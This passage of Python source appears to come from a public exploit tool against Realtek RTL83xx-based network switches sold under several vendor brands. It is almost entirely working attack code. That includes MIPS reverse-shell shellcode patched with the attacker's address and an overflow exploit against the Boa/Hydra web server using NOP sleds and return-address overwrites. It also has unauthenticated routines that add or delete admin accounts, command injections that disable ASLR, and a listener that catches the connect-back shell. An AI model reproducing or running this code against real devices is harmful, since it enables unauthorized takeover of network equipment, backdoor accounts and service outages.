			sorted_dict = OrderedDict(sorted(Vendor_ETag.items(), key=lambda t: t[1])) # sorted by ETag value
			for targets in sorted_dict:
				self.target = copy.deepcopy(Vendor_Template[Vendor_ETag[targets]['template']])
				self.source = Vendor_ETag[targets]
				self.dict_merge(self.target,self.source)
				log.info("ETag: {:<11} [{} {} v{}]".format(targets, self.target['vendor'],self.target['model'],self.target['version']))
			print("")
			return False


		for check in Vendor_ETag.keys():
			if check == self.ETag:
				self.target = copy.deepcopy(Vendor_Template[Vendor_ETag[check]['template']])
				self.source = Vendor_ETag[check]

				self.dict_merge(self.target,self.source)
				return self.target

		return False


class RTK_RTL83xx:

	def __init__(self, rhost, proto, verbose, creds, Raw, lhost, lport):
		self.rhost = rhost
		self.proto = proto
		self.verbose = verbose
		self.credentials = creds
		self.Raw = Raw
		self.lhost = lhost
		self.lport = lport

		self.event = threading.Event()

		self.headers = {
			'Host':rhost,
			'User-Agent':'Chrome'
			}

	#
	# Workaround for Planet Tech. and others as it will always be logged in at my LAB
	#
	def Workaround_logout(self):
		try:
			URI = '/cgi-bin/dispatcher.cgi?cmd=3'
			response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,None,None,True) 
			return True
		except Exception as e:
			return True
			pass

	#
	# Very rare I have seen garbage returned with JSON data
	# make sure to clean out potential garbage, so we can load JSON with json.loads()
	#
	def clean_json(self, text):
		self.text = text

		start = 0
		result = ''

		for check in range(0,len(self.text)):
			if self.text[check] == '{':
				result += self.text[check]
				start = start + 1
			elif start:
				result += self.text[check]
				if self.text[check] == '}':
					start = start - 1

		return result

	#
	# Small function to return N in random chars
	#
	def random_string(self,length):
		self.length = length

		return 'A' * self.length
		#return ''.join(random.choice(string.lowercase) for i in range(self.length))

	def md5hash(self, string, base64encode):
		self.string = string
		self.base64encode = base64encode

		hash_object = hashlib.md5(self.string)
		md5_hash = hash_object.hexdigest()

		if self.base64encode:
			return base64.b64encode(md5_hash)	# Why...
		else:
			return md5_hash

	def caesar_encode(self, string):
		self.string = string

		return ''.join(chr(32 + int(ord(self.string[char])) % 95) for char in range(0,len(self.string)))

	def caesar_decode(self, string):
		self.string = string

		return ''.join(chr(int(ord(self.string[char])) - 32 % 95) for char in range(0,len(self.string)))

	#
	# Obfuscation
	# 
	# Functionality:
	# Reversed password string, split each character 7 bytes apart, split and put size of password at two fixed locations in the string,
	# then fill the rest with random garbage to look like advanced and unknown encryption
	#
	# Netgear: GS728TPv2, GS728TPPv2, GS752TPv2, GS752TPP
	# Zyxel: GS1900-24-2.40_AAHL.1_20180705
	#
	def obfuscation_encode(self, password):
		self.password = password

		text = ''
		possible = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

		# Max 99 char in password
		self.password = self.password[:99]

		inlen = len(self.password)
		inlenn = len(self.password)

		if (len((self.password) * 7) + 7) <= 320:
			PASS_LEN = 321 # string needs to be 320 bytes as minimum
		else:
			PASS_LEN = (len((self.password) * 7) + 7)

		for i in xrange(1, PASS_LEN ,1):
			if (0 == i % 7 and inlen > 0):
				text += self.password[inlen-1]
				inlen = inlen - 1
			elif (i == 123):
				if inlenn < 10:
					text += '0'
				else:
					text += str(int(math.floor(inlenn / 10)))
			elif (i == 289):
				text += str(inlenn % 10)
			else:
				#text += '_'	# debug
				text += possible[int(math.floor(randint(0, len(possible)-1)))] # random garbage

		return text

	#
	# Obfuscation
	#
	# Netgear: GS728TPv2, GS728TPPv2, GS752TPv2, GS752TPP
	# Zyxel: GS1900-24-2.40_AAHL.1_20180705
	#
	def obfuscation_decode(self, password):
		self.password = password

		text = ''
		for i in range(1, len(self.password) ):
			if (0 == i % 7):
				if len(text) == (int(self.password[122]) * 10) + int(self.password[288]):
					break
				text += self.password[i-1]
		text = text[::-1] # reverse string
		return text

	def netgear_hash(self, URI):
		self.URI = URI

		return '&hash=' + self.md5hash(URI.split("?")[1],False)

	def _encrypt_RSA(self, modulus, passphrase, text):
		key = RSA.construct((modulus, passphrase))
		cipher = PKCS1_v1_5.new(key)
		ciphertext = cipher.encrypt(text)
 
		return ciphertext
  
	def RSA_encrypt_params(self, cisco_modulus, password):
		self.cisco_modulus = cisco_modulus
		self.password = password

		encrypted_passphrase = self._encrypt_RSA(string.atol(self.cisco_modulus, 16),
												 string.atol("10001", 16),
												 self.password)
		return base64.b64encode(encrypted_passphrase)

	def RSA_Password(self, string):
		self.string = string

		URI = target['modulus_uri']
		response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,headers,None,None,False)
		result = json.loads(response.read())

		if result['data']['modulus']:
			cipher = self.RSA_encrypt_params(result['data']['modulus'], str(self.string))
		else:
			return self.string

		return urllib.quote_plus(cipher)

	def check_XSID(self, target):
		self.target = target

		if self.target['xsid']:
			return True
		else:
			return False

	def Cisco_XSID(self,target):
		self.target = target

		URI = target['xsid_uri']
		response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,headers,None,None,False)
		result = json.loads(response.read())

		if result['data']['modulus']:
			cipher = self.RSA_encrypt_params(result['data']['modulus'],str(result['data']['xsid']))
			return cipher
		else:
			return result['data']['xsid']

	def shellcode(self):

		#
		# Reverse shell
		#
		# SRC: https://www.exploit-db.com/exploits/45541
		#
		MIPSeb = string.join([
			"\x24\x0f\xff\xfa"	# li	$t7, -6
			"\x01\xe0\x78\x27"	# nor $t7, $zero
			"\x21\xe4\xff\xfd"	# addi $a0, $t7, -3
			"\x21\xe5\xff\xfd"	# addi $a1, $t7, -3
			"\x28\x06\xff\xff"	# slti $a2, $zero, -1
			"\x24\x02\x10\x57"	# li	$v0, 4183 ( sys_socket )
			"\x01\x01\x01\x0c"	# syscall 0x40404
			"\xaf\xa2\xff\xff"	# sw	$v0, -1($sp)
			"\x8f\xa4\xff\xff"	# lw	$a0, -1($sp)
			"\x34\x0f\xff\xfd"	# li	$t7, -3 ( sa_family = AF_INET )
			"\x01\xe0\x78\x27"	# nor $t7, $zero
			"\xaf\xaf\xff\xe0"	# sw	$t7, -0x20($sp)
			# ================ You can change port here  =================
			"\x3c\x0ePP0PP1"	# lui $t6, 0x115c ( sin_port = 0x115c ) # 4444
			# ============================================================
			"\x35\xce\x7a\x69"	# ori $t6, $t6, 0x7a69 
			"\xaf\xae\xff\xe4"	# sw	$t6, -0x1c($sp)
			# ================ You can change ip here  =================
			"\x3c\x0eIP1IP2"	# lui $t6, 0xc0a8	   ( sin_addr = 0xc0a8 ... # 192 168
			"\x35\xceIP3IP4"	# ori $t6, $t6, 0x029d ... 0x3901 # 57 1
			# ============================================================
			"\xaf\xae\xff\xe6"	# sw	$t6, -0x1a($sp)
			"\x27\xa5\xff\xe2"	# addiu   $a1, $sp, -0x1e
			"\x24\x0c\xff\xef"	# li	$t4, -17  ( addrlen = 16 )
			"\x01\x80\x30\x27"	# nor $a2, $t4, $zero
			"\x24\x02\x10\x4a"	# li	$v0, 4170 ( sys_connect )
			"\x01\x01\x01\x0c"	# syscall 0x40404
			"\x24\x0f\xff\xfd"	# li	t7,-3
			"\x01\xe0\x28\x27"	# nor a1,t7,zero
			"\x8f\xa4\xff\xff"	# lw	$a0, -1($sp)   
			# dup2_loop:
			"\x24\x02\x0f\xdf"	# li	$v0, 4063 ( sys_dup2 )
			"\x01\x01\x01\x0c"	# syscall 0x40404
			"\x24\xa5\xff\xff"	# addi a1,a1,-1 (\x20\xa5\xff\xff)
			"\x24\x01\xff\xff"	# li	at,-1
			"\x14\xa1\xff\xfb"	# bne a1,at, dup2_loop
			"\x28\x06\xff\xff"	# slti $a2, $zero, -1
			"\x3c\x0f\x2f\x2f"	# lui $t7, 0x2f2f (//)
			"\x35\xef\x62\x69"	# ori $t7, $t7, 0x6269 (bi)
			"\xaf\xaf\xff\xec"	# sw	$t7, -0x14($sp)
			"\x3c\x0e\x6e\x2f"	# lui $t6, 0x6e2f (n/)
			"\x35\xce\x73\x68"	# ori $t6, $t6, 0x7368 (sh) 
			"\xaf\xae\xff\xf0"	# sw	$t6, -0x10($sp)
			"\xaf\xa0\xff\xf4"	# sw	$zero, -0xc($sp)
			"\x27\xa4\xff\xec"	# addiu   $a0, $sp, -0x14
			"\xaf\xa4\xff\xf8"	# sw	$a0, -8($sp)
			"\xaf\xa0\xff\xfc"	# sw	$zero, -4($sp)
			"\x27\xa5\xff\xf8"	# addiu   $a1, $sp, -8
			"\x24\x02\x0f\xab"	# li	$v0, 4011 (sys_execve)
			"\x01\x01\x01\x0c"	# syscall 0x40404
			"\x8f\x84\x80\x18"	# Variant of NOP
			], '')	


		# Connect back IP
		ip_hex = '{:02x} {:02x} {:02x} {:02x}'.format(*map(int, self.lhost.split('.')))
		ip_hex = ip_hex.split()
		IP1=ip_hex[0];IP2=ip_hex[1];IP3=ip_hex[2];IP4=ip_hex[3];

		# Let's break apart the hex code of LPORT into two bytes
		port_hex = hex(int(self.lport))[2:]
		port_hex = port_hex.zfill(len(port_hex) + len(port_hex) % 2)
		port_hex = ' '.join(port_hex[i: i+2] for i in range(0, len(port_hex), 2))
		port_hex = port_hex.split()
		if len(port_hex) == 1:
			port_hex = ('00' + ' ' + ''.join(port_hex)).split()

		#
		# Replace IP and PORT in shellcode
		#
		MIPSeb = MIPSeb.replace('PP0',chr(int(port_hex[0],16)))
		MIPSeb = MIPSeb.replace('PP1',chr(int(port_hex[1],16)))

		MIPSeb = MIPSeb.replace('IP1',chr(int(IP1,16)))
		MIPSeb = MIPSeb.replace('IP2',chr(int(IP2,16)))
		MIPSeb = MIPSeb.replace('IP3',chr(int(IP3,16)))
		MIPSeb = MIPSeb.replace('IP4',chr(int(IP4,16)))

		return MIPSeb

	#
	# Access: Unauthorized
	#
	# Start thread for exploting, create a listener on LPORT, wait for connection and stop the exploit thread when remote connected
	#
	# Note:
	# The vulnerability are _not_ from Boa nor Hydra, coming from Realtek coding.
	# The device should be newly restarted and/or not been accessed with http/https, so the heap is relative untouched.
	#
	# This code will:
	# 1. Trigger stack overflow in boa/Hydra web server [ extractVmlinuxImage(), getFdStr() ]
	# 2. Overwrite first byte in provided RA with 0x00, so we can jump within the binary
	# 3. Jump to our gadget
	# 4. Jump to NOP sled and shellcode on heap
	# 5. Launch forked() reverse shell
	# 6. Try restart Boa/Hydra (to mitigate DoS)
	#
	# Success: Reverse shell and restarted Boa/Hydra
	# Failure: No reverse shell and crashed Boa/Hydra (DoS)
	#
	def heack_hydra_shell(self, target):
		self.target = target

		if not self.target['exploit']['heack_hydra_shell']['vulnerable']:
			log.failure("Not listed as vulnerable")
			return False

		# Connect-timeout in seconds
		timeout = 20
		socket.setdefaulttimeout(timeout)

		thread.start_new_thread(self.heack_hydra_exploit,("heack_hydra_exploit",self.target,))

		lsock = listen(port=self.lport)
		c = lsock.wait_for_connection()
		if not self.event.is_set():
			c.interactive(prompt = '# ')
			return True
		else:
			log.failure("Got internal connection to quit")
			c.close()
			return False

	#
	# Access: Unauthorized
	#
	def heack_hydra_exploit(self, threadName, target):
		self.threadName = threadName
		self.target = target
		CRLF_NOP = 0x24060d0a # NOP w/ CRLF (li $a2, 0x00000D0A)
		NOP =  0x2406ffff	# NOP (li $a2, 0xFFFFFFFF)
		JUMP = 0x04110111 # bal +273

		# Debug
		#CRLF_NOP = 0x4c460d0a # LF\r\n
		#NOP = 0x6e6f6f70 # noop
		#JUMP = 0x4a4d5044 # JMPD
		#MIPSeb = ("\x43\x4f\x44\x45" * 45) + "\x4e\x4f\x4f\x50" # CODE + NOOP = 148 bytes

		query_args = ''

		#
		# This will overwrite RA:
		#
		
		#
		# NETGEAR: 'getFdStr()' modified, this is weird 'solution' to have $t9 loaded with JMP in 'fwrite()'
		#
		if self.target.get('hash_uri'): # NETGEAR Inc. (GS728TPv2, GS728TPPv2, GS752TPv2, GS752TPP)
			query_args += struct.pack('>L',(self.target['exploit']['heack_hydra_shell']['gadget'])) * 76 # direct heap address
		else:
			query_args += (struct.pack('>L',NOP) * 73) + struct.pack('>L',JUMP) + struct.pack('>L',NOP) # 300 bytes + RA below

		#
		# Return address to where we want jump (0x58 will be overwritten with 0x00 below)
		query_args += struct.pack('>L',(self.target['exploit']['heack_hydra_shell']['gadget'] + 0x58000000)) # 0x58xxxxxx

		#
		# Space between new RA and overwrite with 0x00 (Range: 1 => 3)
		#
		query_args += ((struct.pack('>L',NOP) * 63) + struct.pack('>L',CRLF_NOP)) * 2

		# CRLF_NOP will overwrite '0x58' in above RA address with 0x00, as the code will always terminate CRLF with 0x00
		#
		# 7FF4BE60  6E 6F 6F 70 6E 6F 6F 70  6E 6F 6F 70 6E 6F 6F 70  noopnoopnoopnoop
		# 7FF4BE70  6E 6F 6F 70 6E 6F 6F 70  6E 6F 6F 70 6E 6F 6F 70  noopnoopnoopnoop
		# 7FF4BE80  6E 6F 6F 70 6E 6F 6F 70  4C 46 0D 0A 00 40 FF AC  noopnoopLF...@.. <=== 'X' overwritten with 0x00
		#
		query_args += (struct.pack('>L',NOP) * 74) + struct.pack('>L',CRLF_NOP) # 300 bytes + 0x00

		#
		# $v0 = tmpHeaderSize
		# $gp = pointing to heap
		#
		# Gadget:
		# addu $v0,	$g0 # The addition of $v0 and $g0 points to our heap NOP sled
		# jr	$v0 	# Its lovely when [heap] are rwxp :>
		#
		# This adjusting $v0 value (Range: 4 => 9)
		#
		query_args += ((struct.pack('>L',NOP) * 63) + struct.pack('>L',CRLF_NOP)) * self.target['exploit']['heack_hydra_shell']['v0']

		#
		# fork() reverse shell to get new PID, and jump over child
		#
		query_args += struct.pack('>L',0x24020fa2) # li $v0, 4002 ( fork )
		query_args += struct.pack('>L',0x0101010c) # syscall unk_40404
		query_args += struct.pack('>L',0x1c400101) # bgtz    $v0, +257 ( Jump over child to restart boa/Hydra )

		#
		# Child
		#
		query_args += ((struct.pack('>L',NOP) * 60) + struct.pack('>L',CRLF_NOP))
		query_args += ((struct.pack('>L',NOP) * 63) + struct.pack('>L',CRLF_NOP))
		query_args += ((struct.pack('>L',NOP) * 63) + struct.pack('>L',CRLF_NOP))
		#
		# Shellcode
		#
		query_args += self.shellcode()
		query_args += ((struct.pack('>L',NOP) * 17) + struct.pack('>L',CRLF_NOP))

		#
		# Parent
		#
		query_args += (struct.pack('>L',NOP) * 59)
		#
		# Restart Boa/Hydra to mitigate DoS
		# (From boa/Hydra binary == binary dependent)
		#
		query_args += struct.pack('>L',0x8f848018) # opcode [la $a0, 0x430000]
		query_args += struct.pack('>L',self.target['exploit']['heack_hydra_shell']['system']) # opcode, binary dependent [la $t9, system]
		query_args += struct.pack('>L',0x0320f809) # opcode [jalr $t9 ; system]
		query_args += struct.pack('>L',self.target['exploit']['heack_hydra_shell']['handler']) # opcode, binary dependent [addiu $a0, (.ascii "handler -c boa &" - 0x430000)]
		query_args += struct.pack('>L',CRLF_NOP)
		#
		# Parent Boa/Hydra will get SIGSEGV here, but we do not care as its restarted
		#

		URI = self.target['exploit']['heack_hydra_shell']['uri'] + (struct.pack('>L',NOP) * 247) + struct.pack('>L',JUMP) + struct.pack('>L',NOP)


		if self.target.get('hash_uri'): # NETGEAR Inc. (GS728TPv2, GS728TPPv2, GS752TPv2, GS752TPP)
			URI = self.target['exploit']['heack_hydra_shell']['uri']
			URI += '&&' # align
			URI += self.netgear_hash(URI)
		#
		# Everything here is designed to have opcodes properly aligned in memory
		#
		MESSAGE = 'POST   '+ URI + ' HTTP/1.1\r\n'	# Important with 3x 0x20 between POST and URI to align opcodes at heap
		MESSAGE += 'Content-Length: 3133337\r\n'	# Trick Boa/Hydra to think we will send more than 1MiB
		MESSAGE += 'Host:PWN' + '\r\n\r\n'			# 'PWN' = Align opcodes in memory
		DEBUG("SEND",MESSAGE)
		MESSAGE += query_args


		log.success("Payload: {} bytes, $v0: {}".format(len(query_args),hex(len(query_args)) ))

		self.rport = int(self.rhost.split(":")[1])
		self.rhost = self.rhost.split(":")[0]

		try:
			r = remote(self.rhost,self.rport,ssl=False) # HTTP Working, about 0x105c in $v0
			#r = remote(self.rhost,self.rport,ssl=True) # HTTPS Not working, need minimium 0x4350 in $v0
		except Exception as e:
			# Dirty but works
			self.event.set()
			remote("127.0.0.1",self.lport,ssl=False)
			return False
		try:
			r.send(MESSAGE)
			r.close()
		except Exception as e:
			# Dirty but works
			self.event.set()
			remote("127.0.0.1",self.lport,ssl=False)
			return False

	#
	# Access: N/A
	# Exploitable: N/A
	#
	# Start thread for exploting, create a listener on LPORT, wait for connection and stop the exploit thread when remote connected
	#
	def heack_shell(self, target):
		self.target = target

		if not self.target['exploit']['heack_cgi_shell']['vulnerable']:
			log.failure("Not listed as vulnerable")
			return False

		thread.start_new_thread(self.heack_exploit,("heack_exploit",self.target))

		l = listen(port=lport)
		c = l.wait_for_connection()
		if not self.event.is_set():
			self.event.set() # Success, got the connection, stop trying to exploit
			c.interactive(prompt = '# ')
			return True
		else:
			log.failure("Got internal connection to quit")
			c.close()
			return False

	#
	# Access: Unauthorized
	#
	# This will load shellcode on remote, used for both stack and heap.
	# stack: walk down in stack and hit the NOP sled to execute shellcode
	# heap: walk up on heap and hit the NOP sled to execute shellcode
	#
	def heack_exploit(self, threadName, target):
		self.threadName = threadName
		self.target = target

		time.sleep(2) # So this will be consistent after output from 'reverse_shell'
		shell = log.progress('shellcode')

		self.Workaround = self.target['exploit']['heack_cgi_shell']['workaround']

		NOP = 0x2406ffff	# NOP (li $a2, 0xFFFFFFFF)

		START = self.target['exploit']['heack_cgi_shell']['START']

		if self.target['exploit']['heack_cgi_shell']['stack']:
			EXPR = (START > self.target['exploit']['heack_cgi_shell']['STOP']) # down on stack
		else:
			EXPR = (START < self.target['exploit']['heack_cgi_shell']['STOP']) # up on heap

		while EXPR:
			if self.Workaround:
				self.Workaround_logout()

			shell.status("{} searching".format(hex(START)))
			#
			#
			query_args = self.target['exploit']['heack_cgi_shell']['query']
			query_args = query_args.replace("_ALIGN",self.random_string(self.target['exploit']['heack_cgi_shell']['align']))
			query_args = query_args.replace("_USRNOP",struct.pack('>L',NOP) * self.target['exploit']['heack_cgi_shell']['usr_nop'])
			query_args = query_args.replace("_SHELLCODE",self.shellcode())
			query_args = query_args.replace("_PWDNOP",struct.pack('>L',NOP) * self.target['exploit']['heack_cgi_shell']['pwd_nop']) # Filler only

			if self.target['login']['encryption'] == 'caesar':
				query_args = query_args.replace("_RA_START",struct.pack('>L',START + 0xc1c1c1c1)) # caesar bug? =]
			else:
				query_args = query_args.replace("_RA_START",struct.pack('>L',START))

			try:
				URI = self.target['exploit']['heack_cgi_shell']['login_uri']
				response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded

				#DEBUG("RECV",response.read())
				#self.event.set()
				#r = remote("127.0.0.1",self.lport,ssl=False)
				#r.close()

			except Exception as e:
				if e.code == 502:
					pass
				else:
					shell.failure(str(e))
					self.event.set()
					r = remote("127.0.0.1",self.lport,ssl=False)
					r.close()
					return False

			if self.event.is_set():
				shell.success("{} <= found".format(hex(START))) # Its lovely when [stack] are rwxp :>
				return True

			if self.target['exploit']['heack_cgi_shell']['stack']:
				START = START - 0x30 # Walk down from top of stack
			else:
				START = START + 0xC00 # Walk up on heap (and bigger jumps)

		shell.failure("Not found, play with start/stop addresses?")
		# Little dirty but works
		self.event.set()
		r = remote("127.0.0.1",self.lport,ssl=False)
		r.close()
		return False

	#
	# Access: Unauthorized
	#
	def stack_add_account(self, target):
		self.target = target

		account = log.progress("Stack ADD Account")

		if not self.target['exploit']['stack_cgi_add_account']['vulnerable']:
			account.failure("Not listed as vulnerable")
			return False

		URI = self.target['exploit']['stack_cgi_add_account']['uri']

		log.info("Credentials: {}/{}".format(str(self.credentials.split(':')[0]),str(self.credentials.split(':')[1])))

		self.Workaround = self.target['exploit']['stack_cgi_add_account']['workaround']
		if self.Workaround:
			self.Workaround_logout()

		try:
			time.sleep(1)
			query_args = self.target['exploit']['stack_cgi_add_account']['content']
			query_args = query_args.replace("_JUMP_", urllib.quote_plus(struct.pack('>L',self.target['exploit']['stack_cgi_add_account']['address'] + 0x58000000)) ) # 0x58 will be overwritten
			query_args = query_args.replace("_CMD_",self.target['exploit']['stack_cgi_add_account']['account'])
			query_args = query_args.replace("USERNAME",str(self.credentials.split(':')[0]))
			query_args = query_args.replace("PASSWORD",str(self.credentials.split(':')[1]))
			DEBUG("SEND",(URI, query_args))

			response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
			DEBUG("RECV",response.read())
			account.failure(response.code)
			return False

		except Exception as e:
			DEBUG("RECV",str(e))
			if e.code == 502:
				account.success("success")
				if self.Workaround:
					self.Workaround_logout()
				pass
			else:
				account.failure(str(e))
				return False
	#
	# Access: Unauthorized
	#
	def stack_del_account(self, target):
		self.target = target

		account = log.progress("Stack DEL Account")

		if not self.target['exploit']['stack_cgi_del_account']['vulnerable']:
			account.failure("Not listed as vulnerable")
			return False

		URI = self.target['exploit']['stack_cgi_del_account']['uri']

		self.Workaround = self.target['exploit']['stack_cgi_del_account']['workaround']
		if self.Workaround:
			self.Workaround_logout()

		try:
			time.sleep(1)
			query_args = self.target['exploit']['stack_cgi_del_account']['content']
			query_args = query_args.replace("_JUMP_", urllib.quote_plus(struct.pack('>L',self.target['exploit']['stack_cgi_del_account']['address'] + 0x58000000)) ) # 0x58 will be overwritten
			query_args = query_args.replace("_CMD_",self.target['exploit']['stack_cgi_del_account']['account'])
			query_args = query_args.replace("USERNAME",self.credentials.split(':')[0])
			DEBUG("SEND",(URI, query_args))

			response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
			DEBUG("RECV",response.read())
			account.failure(response.code)
			return False

		except Exception as e:
			DEBUG("RECV",str(e))
			if e.code == 502:
				account.success("success")
				if self.Workaround:
					self.Workaround_logout()
				pass
			else:
				account.failure(str(e))
				return False

	#
	# Access: Unauthorized
	#
	def stack_cgi_diag(self, target):
		self.target = target

		ping = log.progress("Stack DIAG")

		if not self.target['exploit']['heack_cgi_shell']['stack']:
			ping.success("heap selected (ASLR == False)")
			return True

		if not self.target['exploit']['stack_cgi_diag']['vulnerable']:
			ping.failure("Not listed as vulnerable")
			return False

		ASLR_ENABLED = True # Always assume that ASLR is enabled, until verified

		URI = self.target['exploit']['stack_cgi_diag']['uri']

		self.Workaround = self.target['exploit']['stack_cgi_diag']['workaround']
		if self.Workaround:
			self.Workaround_logout()

		try:
			time.sleep(1)
			# Inject  (disable ASLR)
			ping.status("Injecting to disable")
			query_args = self.target['exploit']['stack_cgi_diag']['content']
			query_args = query_args.replace("_JUMP_", urllib.quote_plus(struct.pack('>L',self.target['exploit']['stack_cgi_diag']['web_sys_ping_post'] + 0x58000000)) ) # 0x58 will be overwritten
			query_args = query_args.replace("_CMD_",self.target['exploit']['stack_cgi_diag']['sys_ping_post_cmd'])
			DEBUG("SEND",(URI, query_args))

			response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
			DEBUG("RECV",response.read())

			if self.target['exploit']['stack_cgi_diag']['sys_ping_post_SIGSEGV']:
				if self.Workaround:
					self.Workaround_logout()
				ping.failure("Disable Injection: Failed!")
				return False
		except Exception as e:
			DEBUG("RECV",str(e))
			if e.code == 502:
				ping.status("Done")
				if self.Workaround:
					self.Workaround_logout()
				pass
			else:
				ping.failure(str(e))
				return False

		if self.target['exploit']['stack_cgi_diag']['sys_ping_post_check']:
			try:
				time.sleep(1)
				# Inject  (check ASLR)
				ping.status("Injecting to verify")
				query_args = self.target['exploit']['stack_cgi_diag']['content']
				query_args = query_args.replace("_JUMP_", urllib.quote_plus(struct.pack('>L',self.target['exploit']['stack_cgi_diag']['web_sys_ping_post'] + 0x58000000)) ) # 0x58 will be overwritten
				query_args = query_args.replace("_CMD_",self.target['exploit']['stack_cgi_diag']['sys_ping_post_check'])
				DEBUG("SEND",(URI, query_args))

				response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
				DEBUG("RECV",response.read())

				if self.Workaround:
					self.Workaround_logout()
				ping.failure("Verify Injection: Failed!")


			except Exception as e:
				DEBUG("RECV",str(e))
				if e.code == 502:
					time.sleep(1)
					ping.status("Verifying ASLR")
					if self.Workaround:
						self.Workaround_logout()
				else:
					ping.failure(str(e))
					return False

		try:
			time.sleep(1)
			URI = self.target['exploit']['stack_cgi_diag']['verify_uri']
			DEBUG("SEND",URI)

			response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,None,None,False) # not encoded
			response = response.read().split()
			DEBUG("RECV",response)

			if response[0] == '0':
				ping.success("ASLR disabled")
				return True
			else:
				ping.failure("ASLR still enabled")
				return False
		except Exception as e:
			DEBUG("RECV",str(e))
			if force:
				ping.success("Forcing... ASLR might been disabled")
				return True
			else:
				ping.failure(str(e))
				log.failure("You can try with --force, some FW do not process correctly after ASLR been disabled")
				log.failure("or you can give --auth_shell a try instead")
				return False

	#
	# Access: Unauthorized
	#
	def stack_cgi_sntp(self, target):
		self.target = target

		SNTP = log.progress("Stack SNTP")

		if not self.target['exploit']['heack_cgi_shell']['stack']:
			SNTP.success("heap selected (ASLR == False)")
			return True

		if not self.target['exploit']['stack_cgi_sntp']['vulnerable']:
			SNTP.failure("Not listed as vulnerable")
			return False

		ASLR_ENABLED = True
		URI = self.target['exploit']['stack_cgi_sntp']['uri']

		self.Workaround = self.target['exploit']['stack_cgi_sntp']['workaround']
		if self.Workaround:
			self.Workaround_logout()

		try:
			time.sleep(1)
			# Enable SNTP
			SNTP.status("Enable SNTP")
			query_args = self.target['exploit']['stack_cgi_sntp']['content']
			query_args = query_args.replace("_JUMP_", urllib.quote_plus(struct.pack('>L',self.target['exploit']['stack_cgi_sntp']['sys_timeSettings_set'] + 0x58000000)) ) # 0x58 will be overwritten
			query_args = query_args.replace("_CMD_",self.target['exploit']['stack_cgi_sntp']['sys_timeSettings_set_cmd_enable'])
			DEBUG("SEND",(URI, query_args))

			response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
			DEBUG("RECV",response.read())

			if self.target['exploit']['stack_cgi_sntp']['sys_timeSettings_set_SIGSEGV']:
				SNTP.failure("Enable SNTP: Failed!")
				return False

			if self.Workaround:
				self.Workaround_logout()

		except Exception as e:
			DEBUG("RECV",str(e))
			if e.code == 502:
				SNTP.status("SNTP Enabled")
				if self.Workaround:
					self.Workaround_logout()
				pass
			else:
				SNTP.failure(str(e))
				return False

		try:
			time.sleep(1)
			# Inject SNTP (disable ASLR)
			SNTP.status("Injecting to disable")
			query_args = self.target['exploit']['stack_cgi_sntp']['content']
			query_args = query_args.replace("_JUMP_", urllib.quote_plus(struct.pack('>L',self.target['exploit']['stack_cgi_sntp']['sys_timeSntp_set'] + 0x58000000)) ) # 0x58 will be overwritten
			query_args = query_args.replace("_CMD_",self.target['exploit']['stack_cgi_sntp']['sys_timeSntp_set_cmd'])
			DEBUG("SEND",(URI, query_args))

			response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
			DEBUG("RECV",response.read())

			if self.Workaround:
				self.Workaround_logout()
			SNTP.failure("Disable Injection: Failed!")
			return False
		except Exception as e:
			DEBUG("RECV",str(e))
			if e.code == 502:
				SNTP.status("Done")
				if self.Workaround:
					self.Workaround_logout()
				pass
			else:
				SNTP.failure(str(e))
				return False

		if self.target['exploit']['stack_cgi_sntp']['sys_timeSntp_set_check']:
			try:
				time.sleep(1)
				# Inject SNTP (check ASLR)
				SNTP.status("Injecting to verify")
				query_args = self.target['exploit']['stack_cgi_sntp']['content']
				query_args = query_args.replace("_JUMP_", urllib.quote_plus(struct.pack('>L',self.target['exploit']['stack_cgi_sntp']['sys_timeSntp_set'] + 0x58000000)) ) # 0x58 will be overwritten
				query_args = query_args.replace("_CMD_",self.target['exploit']['stack_cgi_sntp']['sys_timeSntp_set_check'])
				DEBUG("SEND",(URI, query_args))

				response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
				DEBUG("RECV",response.read())

				if self.Workaround:
					self.Workaround_logout()
				SNTP.failure("Verify Injection: Failed!")
				return False
			except Exception as e:
				DEBUG("RECV",str(e))
				if e.code == 502:
					pass
				else:
					SNTP.failure(str(e))
					return False


		SNTP.status("Verifying ASLR")
		if self.Workaround:
			self.Workaround_logout()

		try:
			time.sleep(1)
			URI = self.target['exploit']['stack_cgi_sntp']['verify_uri']
			DEBUG("SEND",URI)
			response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,None,None,False) # not encoded
			response = response.read().split()
			DEBUG("RECV",response)

			if response[0] == '0':
				SNTP.success("ASLR disabled")
				ASLR_ENABLED = False
			else:
				SNTP.failure("ASLR Enabled")
				return False

		except Exception as e:
			DEBUG("RECV",str(e))
			if force:
				SNTP.success("Forcing... ASLR might been disabled")
			else:
				SNTP.failure(str(e))
				return False

		try:
			time.sleep(1)
			# Delete SNTP injection
			URI = self.target['exploit']['stack_cgi_sntp']['uri']
			SNTP.status("Removing injection")
			query_args = self.target['exploit']['stack_cgi_sntp']['content']
			query_args = query_args.replace("_JUMP_", urllib.quote_plus(struct.pack('>L',self.target['exploit']['stack_cgi_sntp']['sys_timeSntpDel_set'] + 0x58000000)) ) # 0x58 will be overwritten
			query_args = query_args.replace("_CMD_",self.target['exploit']['stack_cgi_sntp']['sys_timeSntpDel_set_cmd'])
			DEBUG("SEND",(URI, query_args))

			response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,self.headers,query_args,None,False) # not encoded
			DEBUG("RECV",response.read())

